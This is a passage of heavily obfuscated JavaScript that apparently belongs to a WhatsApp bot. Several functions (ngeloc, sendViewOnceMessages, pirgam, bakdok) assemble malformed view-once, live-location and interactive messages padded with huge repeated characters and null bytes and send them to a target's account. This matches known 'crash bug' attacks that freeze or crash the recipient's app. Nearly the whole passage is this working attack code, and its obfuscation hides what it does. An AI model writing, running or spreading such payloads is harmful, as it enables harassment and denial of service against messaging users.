0x148)+_0x279901(0x619,0x1c8,0x66b,0x41a,0x208)+_0x29f0b3(-0x68,0x15d,-0x52,0x24,0xb)+_0x279901(0x411,0x53e,0x582,0x300,0x198)+_0x279901(0x1d6,-0x29,0x1f9,0x24b,0x516)+_0x307533(-0x135,0x1b8,0x111,0x11,0x82)+_0xf1b353(0x1ce,0x54a,0x2d0,0x2c5,0x404)+_0x279901(0x55,-0x6f,-0x1bd,0x76,-0xb1)+_0x30a091(0x149,0x255,0x3c8,0xd2,0x2e6)+_0x30a091(0x82,0x188,0x195,0x2ea,0x348)+_0x30a091(0xb,-0x8f,-0x21b,-0x1c9,-0x100)+_0x279901(0x142,0x202,-0x252,-0x33,-0x1d7)+_0x30a091(0x397,0x38b,0x531,0x199,0x3da)+_0x307533(0xe0,-0x176,0x249,0x158,0x28)+_0x29f0b3(0x47b,0x2d8,0x166,0x327,0x227)+_0xf1b353(0x4f6,0x367,0x3c3,0x7fa,0x58d)+_0x30a091(0x257,0x210,0x50f,0xcd,0x102)+_0x307533(0x5d3,0x273,0x63a,0x1d9,0x483)+_0xf1b353(0x6b4,0x19f,0x2c2,0x666,0x43d)+_0x30a091(0x345,0x44c,0x33b,0x3eb,0x5ff)+_0xf1b353(0x965,0x8f5,0x9ae,0x570,0x7ee)+_0xf1b353(0x358,0x2a2,0x144,0x2f1,0x3be)+_0x30a091(-0x162,0x161,0x83,0x10,0x67)+_0x307533(0x320,0x42f,0x51b,0x1c6,0x2f0)+_0xf1b353(0x32d,0x16a,0x163,0x1d4,0x3c0)+_0xf1b353(0x995,0x438,0x498,0x7e4,0x708)+_0x30a091(0xa8,0x217,-0x17e,0x22f,-0xb1)+_0x30a091(-0x1a4,-0x457,-0xdb,-0x3fe,-0x209)+_0x29f0b3(0x2cf,-0x36,-0x1d4,0xe0,0x24)+_0x30a091(0x2b5,0x19e,0x556,0x8f,0x436)+_0x29f0b3(0x172,0x33d,0x39c,0x311,0x2bc)+_0x279901(0x117,0x135,-0x1ac,-0x3d,0x19e)+_0x279901(-0x5f,0x2ab,0x26,0x124,0xc0)+_0x30a091(-0x27,0x140,0x231,0x2a2,0x196)+_0xf1b353(0x59c,0x468,0x846,0x715,0x59b)+_0x29f0b3(0x14d,0x8f,0x247,0x2b0,0x35d)+_0x29f0b3(0x69a,0x2c3,0x325,0x5dd,0x3e6)+_0x307533(0x20b,0x52b,0xf1,0x36b,0x3c8)+_0x29f0b3(0x3e4,0x322,0x114,0x5ac,0x307)+_0xf1b353(0x2fc,0x1a4,0x2d8,0x31f,0x2ad)+_0x279901(0x103,0x183,0x583,0x3d8,0x4d9)+_0x307533(-0x3e,0x23c,0x384,0x1ee,0x296)+_0x30a091(-0xb7,-0x38,0xe,-0x66,-0x285)+_0x279901(-0x32,-0x99,-0x2e6,-0x25,0x27)+_0x307533(0x2fc,0x3d0,0x2ca,0x118,0x213)+_0x307533(0x570,0x6f4,0x3c2,0x639,0x460)+_0xf1b353(0x55c,0x8a5,0x628,0x747,0x7a6)+_0x307533(0x57b,0x5ed,0x79b,0x6ba,0x4f9)+_0xf1b353(0x69f,0x431,0x4f5,0x8be,0x6f3)+_0x279901(0x26c,0x275,0x304,0x3ef,0x550)+_0x307533(0x187,0x133,-0x10b,-0x58,0x1c0)+_0xf1b353(0x67d,0x2b6,0x2a9,0x487,0x579)+_0xf1b353(0x693,0x7d7,0x784,0x416,0x513)+_0x279901(0x1b6,-0xcf,-0x270,-0x37,-0x7e)+_0x30a091(-0xa9,-0x70,0x140,-0x367,0x91)+_0x279901(0x63e,0x1a8,0x385,0x422,0x41b)+_0x30a091(0x1ef,0x454,0x1d5,0x324,0x3a2)+_0x279901(0x383,0x73,0x1e4,0x25e,0xac)+_0x29f0b3(-0x251,0x19b,-0x12,0x97,-0x30)+_0x29f0b3(0x4f8,0x314,0x5d5,0x35e,0x368)+_0x29f0b3(0x1e8,0x7b,0x238,0x2f0,0x194)+_0xf1b353(0x672,0x4f0,0x503,0x311,0x506)+_0x279901(0x5e6,0x3ac,0x110,0x3c6,0x561)+_0x279901(0x142,-0xf4,-0x1b0,0x120,0x13c)+_0x30a091(0x182,0x41e,0x311,0x2e,-0x1c)+_0x30a091(0x227,0x145,0x31a,0x1a5,-0xa)+_0x30a091(0x32d,0x367,0x593,0x1dc,0x379)+_0xf1b353(0x479,0x5d5,0x8b8,0x7ef,0x67b)+_0x279901(0x4ef,0x360,0x52c,0x41b,0x540)+_0x307533(0x18e,0x27a,0x3f0,0x5f9,0x3a6);const _0x26e362={};_0x26e362[_0x279901(0x1b5,-0x255,-0x1b9,-0x12,0x10c)+'ns']=[_0x44d10b];const force={'key':_0x24ca2c,'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs[_0xf1b353(0x58e,0x4e0,0x1c9,0x60b,0x3b2)+_0xf1b353(0x4f8,0x843,0x644,0x7bf,0x6d1)+'nc'](_0x307533(0x5fa,0x117,0x311,0x5ed,0x354)+_0x30a091(-0x5e,0x169,-0x329,0x12e,-0x2f6)+_0x279901(0x4b6,0x306,0x430,0x4b6,0x6ae))},'nativeFlowMessage':_0x26e362}}};async function ngeloc(_0x55e807,_0x589ef6){function _0x2a5fe2(_0x1c179f,_0x47b001,_0xd96e06,_0x3edb77,_0x289e65){return _0xf1b353(_0x1c179f-0x2b,_0x47b001-0x1e4,_0xd96e06,_0x3edb77-0x1,_0x3edb77-0x12f);}function _0x57e245(_0x261ba5,_0x509d26,_0x8255bf,_0x472d09,_0x1a40dd){return _0xf1b353(_0x261ba5-0x170,_0x509d26-0x17b,_0x8255bf,_0x472d09-0x170,_0x509d26-0x1f3);}const _0x497ac0={'dnxhD':function(_0x1fae2c,_0x385311,_0x398632,_0x5d3844){return _0x1fae2c(_0x385311,_0x398632,_0x5d3844);},'EnAZu':function(_0x3d0bb7,_0x1393c0){return _0x3d0bb7+_0x1393c0;}};function _0x4dda49(_0x5044e1,_0x320fea,_0x202f98,_0x124c68,_0x250216){return _0xf1b353(_0x5044e1-0xb7,_0x320fea-0x19a,_0x250216,_0x124c68-0xd5,_0x124c68- -0x12d);}function _0x2371e1(_0x2100cb,_0x1de4e9,_0x4fb1e8,_0x29b97f,_0x82691f){return _0x30a091(_0x1de4e9-0x158,_0x29b97f,_0x4fb1e8-0x10c,_0x29b97f-0xff,_0x82691f-0xac);}var _0x28c1cf=_0x497ac0[_0x57e245(0x943,0x6e5,0x448,0x5f4,0x5d7)](generateWAMessageFromContent,_0x55e807,proto[_0x4dda49(0x7b1,0x29c,0x5fd,0x531,0x635)+'ge'][_0x2a5fe2(0x717,0x544,0x1c6,0x444,0x706)+_0x2a5fe2(0xb0b,0x889,0x8be,0x83f,0x645)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x497ac0[_0x5e9253(0x1d5,0x15b,0x4c0,0x1fd,0x0)](_0x57e245(0x507,0x7ce,0x94c,0x805,0x8ea)+_0x2371e1(0x262,0x397,0x58d,0x4db,0x627)+_0x4dda49(0x541,0x635,0x1ff,0x360,0x139)+_0x5e9253(0x19,-0x83,0x1e9,0x249,0x15)+_0x5e9253(-0x72,0x116,0x129,0x8b,-0x220)+_0x2371e1(0x218,0xad,0xa5,-0xca,0x331)+_0x2a5fe2(0x49d,0x1e7,0x42d,0x447,0x5e2)+_0x5e9253(-0x8f,0x2a4,-0x1a9,0x10b,0x187)+_0x2371e1(0x208,0x35a,0x4cf,0x2b7,0x1b8)+_0x2a5fe2(0xb70,0xa2a,0x864,0x951,0x6d2)+_0x4dda49(-0xf6,0x3cb,0x3a7,0x16f,-0x66)+_0x2371e1(0x5e4,0x32e,0x37f,0x3f6,0x132)+_0x5e9253(0x47d,0x269,0x420,0x48a,0x318)+_0x5e9253(0x5ec,0x78b,0x2b7,0x4ce,0x5a2)+_0x2371e1(-0x289,0x25,0x8d,0x31,-0x30)+_0x2a5fe2(0x98d,0x9aa,0x5ce,0x76b,0x56c)+_0x5e9253(0x216,-0x2ec,0x144,-0xb4,-0x1ae)+_0x2371e1(0x20e,0x150,-0x5,0x211,-0xe3)+_0x2371e1(0x769,0x521,0x7bf,0x551,0x24f)+_0x2a5fe2(0xb1c,0x629,0x65f,0x8c5,0x67e)+_0x57e245(0xaa6,0x976,0x85e,0xb52,0x8da)+_0x2a5fe2(0x2ba,0x696,0x4aa,0x539,0x4a5)+_0x5e9253(0x253,0xbe,-0x5c,-0x4b,-0x229)+_0x4dda49(0x2e0,0x2ec,0x188,0x184,0x224)+_0x2a5fe2(0x426,0x36f,0x18b,0x401,0x6ad),'ꦾ'[_0x5e9253(0x1ca,0x363,0x345,0x255,0x9c)+'t'](-0x10507+0xba4d+0x10e0a)),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x55e807,'quoted':_0x589ef6});function _0x5e9253(_0x280a03,_0x2df969,_0x4048a8,_0x129e4a,_0xa0af1){return _0xf1b353(_0x280a03-0x171,_0x2df969-0x17c,_0x280a03,_0x129e4a-0xa7,_0x129e4a- -0x350);}await VxoZap[_0x5e9253(0x16f,0x58,-0xea,0x12c,0x131)+_0x2a5fe2(0x59c,0x717,0x537,0x78d,0x71e)+'ge'](_0x55e807,_0x28c1cf[_0x4dda49(0x646,0x609,0x35f,0x635,0x6fb)+'ge'],{'participant':{'jid':_0x55e807},'messageId':_0x28c1cf[_0x57e245(0xc5a,0x9fb,0xc4f,0xb11,0xa8a)]['id']});}async function sendViewOnceMessages(_0x4cddb1){const _0x7ff30c={'HYKma':function(_0x3ba8a4,_0x387b8f,_0x51ea05,_0x26b9ab){return _0x3ba8a4(_0x387b8f,_0x51ea05,_0x26b9ab);},'cHylz':_0x596046(0x1e6,0x1ee,0x48e,0x1ef,0x207)+'rl','YbAVq':_0x596046(0x48d,0x357,0x383,0x2e2,0x590)+_0x3b5487(-0x57,0x274,0x39,0x30c,0x136)+_0x3b5487(0xa9,-0x348,-0x1b6,-0x40e,-0x466)+_0xd50a56(0x3cc,0x875,0x639,0x45a,0x6d6)+_0xd50a56(0x806,0x645,0x607,0x792,0x3c9)+_0xd50a56(0x87a,0x975,0x73e,0x47e,0x4ce)+_0x3b5487(-0x107,-0xf6,0x51,-0x89,0x235)+_0x4c46cf(0x34a,0x7fe,0x546,0x757,0x7b6)+_0x3b5487(0x2af,0x79,0x23f,0x235,0x1b)+_0xb564f3(0x4f9,-0x5d,0x26a,0x254,0x42)+_0x4c46cf(0x5c6,0x629,0x74a,0x6ce,0xa1d)+_0xd50a56(0x2c7,0x5b5,0x373,0x645,0x1a3)+_0xd50a56(0xf1,0x372,0x335,0x236,0x213)+_0x596046(0x1c,-0x2f,-0x79,0x16d,0x142)+_0x596046(-0x8a,0xa3,0x1d6,0x206,0xd2)+_0x4c46cf(0x3cb,0x754,0x4f3,0x720,0x784)+_0x4c46cf(0x78a,0x8ce,0x7d3,0x7bd,0xa4f)+_0x596046(0x2d,0x17b,-0x58,0x47,0x2b6)+_0x3b5487(0x2c6,0x2b3,0x1b6,0x3b7,-0x1d)+_0x4c46cf(0x477,0x2c0,0x45a,0x6c9,0x710)+_0xd50a56(0xe5,0x1cb,0x335,0x44e,0x5c0)+'\x22}'},_0x44935f={};_0x44935f[_0xb564f3(0x85,0xb7,-0xad,-0x1a,-0x351)+_0x596046(-0x84,-0x6a,0x1e5,0x241,-0xaf)+_0xd50a56(0x24f,0x570,0x314,0x56a,0x3c2)+_0x4c46cf(0xf9,0x48a,0x3c1,0x395,0x262)]={},_0x44935f[_0xb564f3(0x76,0x1c7,-0xad,0x19b,0x170)+_0x596046(0xf,-0x6a,-0x47,0x174,0x1af)+_0x3b5487(-0xa4,0x53,-0x199,-0x262,-0x154)+_0xb564f3(0x1af,-0x11e,0xc2,0x1da,-0xc9)+_0xd50a56(0x8e4,0x5d4,0x76b,0x664,0x98f)]=0x2;const _0x268879={};_0x268879[_0x4c46cf(0x3f4,0x597,0x4be,0x5f8,0x2ce)]='';function _0x4c46cf(_0x271b7d,_0x4b39ed,_0x321fb2,_0x2bcb4f,_0x3a474a){return _0x307533(_0x271b7d-0x11c,_0x271b7d,_0x321fb2-0x1e7,_0x2bcb4f-0x11e,_0x321fb2-0x377);}function _0xd50a56(_0x3a13fa,_0x5ef4b2,_0x4b61eb,_0x504376,_0x47fcad){return _0x30a091(_0x4b61eb-0x49a,_0x504376,_0x4b61eb-0x1bc,_0x504376-0x6,_0x47fcad-0x16a);}const _0x21d4a7={};_0x21d4a7[_0x3b5487(0x1a5,-0x25f,-0xd6,0xeb,-0x2c9)]='';function _0xb564f3(_0x5d479a,_0x10f7ad,_0x3a0ca7,_0x29dc41,_0x3059d1){return _0x30a091(_0x3a0ca7-0xf1,_0x3059d1,_0x3a0ca7-0xf5,_0x29dc41-0x47,_0x3059d1-0x54);}const _0x401cf6={};_0x401cf6[_0x3b5487(0x4dc,0x129,0x33f,0x2db,0x617)]='',_0x401cf6[_0x3b5487(-0x23d,0x108,-0x152,-0x3a2,-0x1d2)+_0x4c46cf(0x52f,0x679,0x733,0x7ac,0x985)]='';function _0x596046(_0x1f02de,_0x93f66,_0x9c422a,_0x257ab7,_0x178020){return _0x279901(_0x257ab7,_0x93f66-0x1a7,_0x9c422a-0x1ee,_0x93f66- -0x16b,_0x178020-0x8e);}function _0x3b5487(_0x5e89f8,_0x4770cb,_0x51c8d2,_0x4f0ac3,_0x16bf7a){return _0x30a091(_0x51c8d2- -0x13,_0x16bf7a,_0x51c8d2-0x16b,_0x4f0ac3-0x18f,_0x16bf7a-0x144);}_0x401cf6[_0xd50a56(0x466,0x14b,0x33d,0x1e0,0x4c3)+_0x3b5487(-0x1a9,-0x3a9,-0x1e6,-0x435,0x5)+_0x3b5487(-0x25c,0x9,-0x1f6,0x92,-0x3d)+_0xb564f3(0x13f,0x34,0x24d,0xd8,0x174)]=![];let _0x505dac=_0x7ff30c[_0x596046(0x37,-0x4e,0x6,-0x2d6,-0x3e)](generateWAMessageFromContent,_0x4cddb1,{'viewOnceMessage':{'message':{'messageContextInfo':_0x44935f,'interactiveMessage':proto[_0xd50a56(0x95f,0x782,0x68d,0x729,0x738)+'ge'][_0x3b5487(-0xb5,-0x2c,-0x155,-0x18b,-0x242)+_0x4c46cf(0x747,0x2af,0x47c,0x6ed,0x62e)+_0x3b5487(0x3fc,0xd5,0x321,0x2c7,0x2e6)+_0x596046(0x159,0x313,0x20d,0x348,0x26b)][_0x3b5487(-0x31f,0x5,-0x11c,0x152,-0x2dc)+'e']({'body':proto[_0x4c46cf(0x6f8,0x8dd,0x774,0x93b,0x9e5)+'ge'][_0x4c46cf(0x388,0x46b,0x43f,0x1d0,0x2a5)+_0xd50a56(0x10a,0x555,0x395,0x5e1,0xed)+_0x596046(0x4f7,0x336,0x4b2,0x4f9,0x312)+_0x4c46cf(0x62d,0x82b,0x892,0x85e,0x5f1)][_0xb564f3(-0xc5,0x2a6,0xe6,0x31b,0x1df)][_0x3b5487(0x15f,-0x16e,-0x11c,0x110,0x11e)+'e'](_0x268879),'footer':proto[_0x3b5487(0x3c,0x1e6,0x1e0,-0x9d,0x349)+'ge'][_0x3b5487(-0x92,-0x335,-0x155,0x12,-0x325)+_0xd50a56(0x1c0,0x109,0x395,0xe0,0x3f9)+_0xb564f3(0x27b,0x1de,0x425,0x200,0x5d9)+_0x3b5487(0x4a0,0x30c,0x2fe,0x400,0x4cd)][_0x4c46cf(0x873,0x5e0,0x7e0,0x9d4,0x80f)+'r'][_0xb564f3(-0x2d9,-0x80,-0x18,-0x1ce,-0x78)+'e'](_0x21d4a7),'header':proto[_0x3b5487(0x103,0x169,0x1e0,-0x21,0x170)+'ge'][_0x3b5487(-0x4c,-0x403,-0x155,-0x2aa,0x140)+_0xb564f3(0x18b,0x157,-0x14,-0x65,0x8d)+_0xb564f3(0x5b2,0x484,0x425,0x449,0x5a0)+_0x3b5487(0x547,0x1f0,0x2fe,0x1f1,0x2c2)][_0xd50a56(0x8d5,0x4ee,0x617,0x352,0x486)+'r'][_0x4c46cf(0x27b,0x4ec,0x478,0x415,0x43d)+'e'](_0x401cf6),'nativeFlowMessage':proto[_0x596046(0x44,0x1f5,0x320,0x33d,0x9)+'ge'][_0x596046(-0x2,-0x140,-0x2c6,-0x238,0x168)+_0x3b5487(0x14,-0x7f,-0x118,0x139,-0x231)+_0x3b5487(0x2a8,0x86,0x321,0x2f0,0x2fd)+_0x4c46cf(0x8b6,0x6d0,0x892,0xaee,0x746)][_0x4c46cf(0x865,0x5e8,0x5b3,0x51a,0x35d)+_0x4c46cf(0x4a3,0x68d,0x494,0x593,0x23c)+_0xd50a56(0x73d,0x761,0x68d,0x404,0x562)+'ge'][_0xb564f3(-0x209,0x115,-0x18,-0x204,0x282)+'e']({'buttons':[{'name':_0x7ff30c[_0x3b5487(0x80,0x228,0x2c,-0xe2,-0x1e7)],'buttonParamsJson':_0x7ff30c[_0x3b5487(0x305,0x7,0x1e2,0xe4,0x47e)]}],'messageParamsJson':'\x00'[_0x4c46cf(0x558,0x468,0x6bb,0x71b,0x915)+'t'](-0xcd*-0x2b9+0x183a1+0x11593*-0x2)})})}}},{});VxoZap[_0x596046(0x24e,0x13,0x15a,-0xfe,-0x245)+_0x3b5487(0x268,0x3ab,0x1e0,0x15c,-0x22)+'ge'](_0x4cddb1,_0x505dac[_0xd50a56(0x84f,0x9fe,0x791,0x571,0x858)+'ge'],{'messageId':_0x505dac[_0x4c46cf(0xac8,0x90b,0x91e,0x6c9,0x974)]['id']});}async function pirgam(_0x54e05b,_0x44781d){function _0x17440c(_0x5354ea,_0x41a4b1,_0xe88151,_0x4d00c6,_0x2dc974){return _0x279901(_0x5354ea,_0x41a4b1-0x23,_0xe88151-0x194,_0x41a4b1-0x53c,_0x2dc974-0x11e);}function _0x2019d8(_0x286e9f,_0x312698,_0x1fcfb2,_0x343a13,_0x1be75b){return _0x279901(_0x343a13,_0x312698-0x183,_0x1fcfb2-0x34,_0x312698- -0x17e,_0x1be75b-0x82);}const _0x40ff17={'nCOjg':function(_0x22c116,_0x3c1e6a,_0x4bce48,_0x54f7fa){return _0x22c116(_0x3c1e6a,_0x4bce48,_0x54f7fa);},'XJRWM':_0x2019d8(-0xf3,0x13d,-0x179,0x3e7,-0x18c)+_0x3c984d(0x3bc,0x349,0x1f1,0x545,0x127)+_0x17440c(0x944,0x827,0x632,0x5e9,0x7c1)+_0x3c984d(0x52e,0x7cb,0x9d4,0x90a,0x668)+_0x17440c(0x5c3,0x50c,0x237,0x4f9,0x41c),'IDXTU':function(_0x2727f3,_0x293696,_0x39cc8e){return _0x2727f3(_0x293696,_0x39cc8e);},'glXwm':_0x3c984d(0x560,0x3bc,0x28b,0x103,0x2d7)+_0x3b23f3(0x348,0x5fb,0x3a1,0x4fe,0x5bf)+_0x3c984d(0x591,0x746,0x9c4,0x5a7,0x732)+_0x3b23f3(0x51c,0x31f,0x303,0x56c,0x4e7)+_0x17440c(0x72c,0x99c,0xa22,0x6c7,0x751)+_0x2019d8(-0x77,0x1b6,0x18e,0x7e,-0xac)+_0x2019d8(0xf,0x234,0x10f,0x7c,-0x4e)+_0x3b23f3(0x4ed,0x581,0x585,0x602,0x28e)+_0x3b23f3(0x45f,0x1b9,0x354,0x4ca,0x2f1)+_0x3c984d(0x413,0x425,0x379,0x419,0x45d),'zzPjN':_0x3c984d(0x6ec,0x4fc,0x5d3,0x757,0x60a)+_0x3c984d(0x5d5,0x46c,0x5ba,0x1dd,0x419)+_0x3b23f3(0x3ea,0x43c,0x5f6,0x2cf,0x2bc)+_0x2019d8(-0x28d,-0x49,0x1e3,-0x1c5,-0xa9)+_0x17440c(0xa89,0x7cc,0x534,0x69f,0x501)+_0x3c984d(0x2f7,0x2ac,0x4b6,0x472,0x443)+_0x3b23f3(0x2a6,0x1ad,0x20b,0x159,0x2ea)+_0x2019d8(0x228,0x1b3,0x210,0x209,-0xac)+_0x2019d8(0x273,0x297,0x2b0,0x12c,0x26)+_0x17440c(0xc18,0x958,0xbac,0x9e0,0xafc)+_0x3c984d(0x464,0x3b2,0x604,0x548,0x63f)+_0x5f024b(0x887,0x7ec,0x489,0x6e4,0x59f)+_0x3b23f3(0x11b,-0x10e,0x32c,-0xd6,0x2fc)+_0x2019d8(0x41e,0x351,0x545,0x1db,0x14d)+_0x3b23f3(0x4cc,0x60f,0x77d,0x61a,0x2c0)+_0x3c984d(0x330,0x4c3,0x59d,0x4d5,0x781)+_0x2019d8(-0x3c,0xed,0x1eb,-0x31,0x33d)+_0x17440c(0x689,0x94c,0xc09,0x814,0xa3a)+_0x17440c(0x441,0x707,0x67c,0x90b,0x94c)+_0x3c984d(0x44f,0x681,0x756,0x6a2,0x905)+_0x2019d8(0x465,0x1d4,0x355,0x1f0,0x32c)+_0x5f024b(0x3a4,0x6ca,0x6d0,0x53f,0x71d)+_0x3b23f3(0x44d,0x6d4,0x526,0x2fd,0x5a1)+_0x5f024b(0x8d7,0x676,0x85b,0x604,0x54d)+_0x17440c(0x50e,0x79c,0x72e,0x7ba,0x86c)+_0x17440c(0x6fb,0x99f,0xbda,0x7fd,0x885)+_0x3b23f3(0x5fd,0x6a2,0x401,0x635,0x653)};function _0x5f024b(_0x6f8412,_0x292061,_0x5ec893,_0x5925f7,_0x230966){return _0x30a091(_0x5925f7-0x665,_0x292061,_0x5ec893-0x181,_0x5925f7-0x95,_0x230966-0x103);}const _0x46e0f5={};_0x46e0f5[_0x5f024b(0x79a,0x53f,0x5eb,0x590,0x741)+'d']=VxoZap[_0x3b23f3(0x20b,0x86,-0x1d,0x25e,0x254)+_0x3b23f3(0x548,0x582,0x7fe,0x75f,0x75a)+_0x3c984d(0x2f7,0x59d,0x853,0x5e7,0x66c)+'r'];const _0x41e9a7={};_0x41e9a7[_0x2019d8(-0xa6,-0xd4,0x19d,0x104,-0x1b9)]='';function _0x3b23f3(_0x22c013,_0x26ccb9,_0x50abe7,_0x27a057,_0x2f9cda){return _0x279901(_0x27a057,_0x26ccb9-0x91,_0x50abe7-0x1f1,_0x22c013-0x17a,_0x2f9cda-0x7c);}function _0x3c984d(_0x2618c4,_0x179a56,_0x540b62,_0x4be712,_0x30e1c0){return _0x30a091(_0x179a56-0x445,_0x2618c4,_0x540b62-0x10e,_0x4be712-0x11f,_0x30e1c0-0xf5);}var _0x2db048=_0x40ff17[_0x17440c(0x841,0x71e,0x699,0x6fd,0x624)](generateWAMessageFromContent,_0x54e05b,proto[_0x2019d8(0x1b9,0x1e2,-0x7d,0x67,0x393)+'ge'][_0x17440c(0x2d7,0x553,0x5af,0x2bb,0x478)+_0x17440c(0xaa3,0x94e,0x951,0xb5e,0xb4b)]({'interactiveMessage':{'header':{'title':_0x40ff17[_0x3c984d(0x7b3,0x713,0x4f5,0x91d,0x6ce)],'hasMediaAttachment':!![],...await _0x40ff17[_0x2019d8(-0x1b8,-0x13,-0x27,-0x2c0,-0x90)](prepareWAMessageMedia,{'image':{'url':_0x40ff17[_0x3c984d(0x36f,0x48c,0x4d0,0x519,0x2b5)]}},_0x46e0f5)},'body':_0x41e9a7,'footer':{'text':_0x40ff17[_0x3c984d(0x858,0x7ab,0x856,0x702,0x777)]},'nativeFlowMessage':{'messageParamsJson':'\x00'[_0x3c984d(0x6e1,0x57f,0x502,0x395,0x51c)+'t'](0x1*0x15d8c7+-0x5cf*0x101+-0xc1b8)}}}),{'userJid':_0x54e05b,'quoted':_0x44781d});await VxoZap[_0x17440c(0x8db,0x6ba,0x780,0x77d,0x86a)+_0x5f024b(0x5d5,0x861,0x7ff,0x858,0x944)+'ge'](_0x54e05b,_0x2db048[_0x3b23f3(0x5de,0x40b,0x32d,0x884,0x568)+'ge'],{'participant':{'jid':_0x54e05b},'messageId':_0x2db048[_0x3b23f3(0x684,0x680,0x949,0x859,0x49d)]['id']});}async function bakdok(_0x2ad15b,_0x1e2052){const _0xdeed5e={'EPFdF':function(_0x45807b,_0x5244be,_0x572806,_0x410816){return _0x45807b(_0x5244be,_0x572806,_0x410816);},'uepkz':_0x1b7da3(0x775,0x6b1,0x5ed,0x754,0x6df)+_0x568f9a(0x681,0x6be,0x6fc,0x592,0x807)+_0x1b7da3(0xaf5,0x89c,0x9f7,0xc16,0xb5b)+_0x568f9a(0x2d7,0x268,0x368,0xbf,0x1f0)+_0x1ebea5(0xdd,0x386,0x4af,0x5c1,0x300)+_0x1b7da3(0xb1f,0xc2a,0x9ae,0xc0b,0xb7d)+_0x568f9a(0x170,0x34a,-0xf0,0x1d1,0x2fb)+_0x1ebea5(-0x17e,0xce,0x357,0x1db,-0x46)+_0x5c048b(0x4ba,0x19e,0x2c2,0x9d,0x43a)+_0x5c048b(-0x4f,0x151,0x1ba,0x1f8,0x118)+_0x3041c3(0x20f,0x3d,0xe9,-0xba,0x189)+_0x3041c3(0x3cc,0x2d6,0x1c,0x32b,0x2de)+_0x1ebea5(0x604,0x3f3,0x161,0x1ef,0x373)+_0x1b7da3(0x784,0xb6c,0xa08,0xc96,0xa98)+_0x568f9a(0x5cf,0x166,0x552,0x31a,0xac)+_0x1b7da3(0xa87,0xa8f,0x7c9,0x664,0x873)+_0x5c048b(0x4c6,0x459,0x590,0x52d,0x381)+_0x1b7da3(0xae0,0x631,0x8c9,0x74e,0x6da)+_0x1b7da3(0x4b8,0x9d5,0x76d,0x820,0x610)+_0x5c048b(-0xc0,0x17d,0x13a,-0x162,0xa3)+_0x5c048b(0x545,0x6c4,0x636,0x5da,0x3ce)+_0x568f9a(0x2ed,0x30f,0x544,0x558,0x2e7)+_0x1b7da3(0x449,0x483,0x6cc,0x934,0x598)+_0x568f9a(0x580,0x43a,0x112,0x2e2,0x360)+_0x3041c3(0x361,0x5ae,0x44b,0x692,0x56f)+_0x1ebea5(0x43e,0x541,0x35a,0x2f6,0x507)+_0x5c048b(0xac,0x1a8,0x212,0x4e1,0x13d)+_0x568f9a(0x391,0x599,0x3e9,0x586,0x4f7)+_0x1b7da3(0x95e,0x957,0x983,0x95a,0x7b3)+_0x568f9a(0x62,-0x17c,0xe3,0xb7,0x2d4)+_0x1ebea5(0x203,0x42b,0x5de,0x6f3,0x5de)+_0x568f9a(0x80b,0x3a3,0x762,0x646,0x583)+_0x5c048b(0x60,-0x6d,0xc4,-0x27,0x104)+_0x568f9a(0x365,0x3d5,0x146,0x3cf,0x410)+_0x3041c3(0x6fc,0x40d,0x3c8,0x6c4,0x535)+_0x1b7da3(0xbb7,0x95b,0x961,0x760,0x84c)+_0x3041c3(0x557,0x84f,0x646,0x661,0x65b)+_0x5c048b(0x546,0x3c1,0x560,0x58d,0x74a)+'e','UZekA':_0x3041c3(0x2b1,-0x8e,-0xdd,0x200,0x123),'WMqbZ':_0x5c048b(0x16c,0xb7,0x1be,0x1a,0xe3)+_0x5c048b(-0x65,0x2ad,0x1a8,0x41e,0xe9)+_0x1ebea5(0x156,0x19b,0x37a,0x175,0x24b)+_0x3041c3(0x58f,0x28f,0x3c7,0x588,0x46a)+_0x1b7da3(0x567,0x4fa,0x569,0x297,0x673)+_0x5c048b(0x455,0x309,0x369,0x46d,0x1b4)+_0x568f9a(0x37d,0x4cd,-0x2f,0x1fd,0x83)+_0x3041c3(0x4e6,0x2c1,0x1bb,0x6a3,0x488)+_0x5c048b(0x247,0x25d,0xd1,0x1c2,-0x1e3),'JYStt':_0x1b7da3(0x6c1,0x703,0x865,0x8b0,0x6ac)+_0x1b7da3(0x639,0x86f,0x7da,0x62d,0x74c),'ItZly':_0x3041c3(-0x11,0x115,0x1dd,0x3b1,0x249)+_0x1b7da3(0xc24,0xca4,0xa2e,0x809,0x889)+_0x568f9a(0x3cc,0x2e4,0x319,0x505,0x6b4)+_0x568f9a(0x317,0x592,0x6af,0x568,0x3d9)+_0x3041c3(0x6dc,0x4f6,0x658,0x434,0x53a)+_0x5c048b(0x1f2,0x1f,0xdf,0x325,0x12e)+_0x5c048b(0x5b5,0x6dd,0x452,0x69c,0x220)+_0x568f9a(0xdb,0x334,0x1fd,0x2dc,0x2d0)+_0x3041c3(0x8a5,0x4bc,0x54b,0x6ca,0x610),'YaDIK':function(_0xd4e981,_0x3648d7){return _0xd4e981+_0x3648d7;},'FpvMD':_0x1ebea5(0x539,0x459,0x4da,0x66d,0x654)+_0x5c048b(0x39c,0x105,0x231,0x3ea,0x2b4)+_0x568f9a(0x45a,0x31f,0x434,0x391,0x353)+_0x1ebea5(0x292,0x4c8,0x615,0x77a,0x690)+_0x568f9a(0x618,0x186,0x680,0x458,0x484)+_0x3041c3(0x355,0x3e0,0x603,0x2bc,0x527)+_0x5c048b(0x591,0x5b6,0x329,0x210,0x21c)+_0x3041c3(0x415,0x316,0x49e,0x33c,0x5b0)+_0x1b7da3(0x59d,0x6ef,0x81e,0x7b7,0x55b),'dTzSg':_0x568f9a(0x152,0x1bf,0x3ce,0x30f,0x55f)+_0x3041c3(0xbe,0xf0,0xa4,0x10f,0x1d4)+_0x5c048b(0x286,0x1b1,0x375,0x33b,0x4e9)+_0x3041c3(0x451,0x7ef,0x487,0x42c,0x64f)+_0x1ebea5(0x31c,0x48a,0x642,0x603,0x1d4)+_0x568f9a(0x17,0x2cb,0x19e,0xed,-0xf0)+_0x1ebea5(0x397,0x3e2,0x373,0x132,0x2ce)+_0x3041c3(0x504,0x253,0x6,0x4de,0x278)+_0x1b7da3(0xa67,0x98e,0x93e,0x8d3,0x767)+_0x5c048b(0x7f5,0x6e3,0x5ac,0x366,0x681)+_0x5c048b(0x26b,0x81,0x2ac,0x3b5,0x26d)+_0x1ebea5(0x3d7,0x138,-0x4a,-0x55,-0x116)+_0x5c048b(0x1f1,-0x1d,0x1b7,0x46c,0x62)+_0x1ebea5(0x20c,0x343,0x393,0x3c3,0x1dd)+_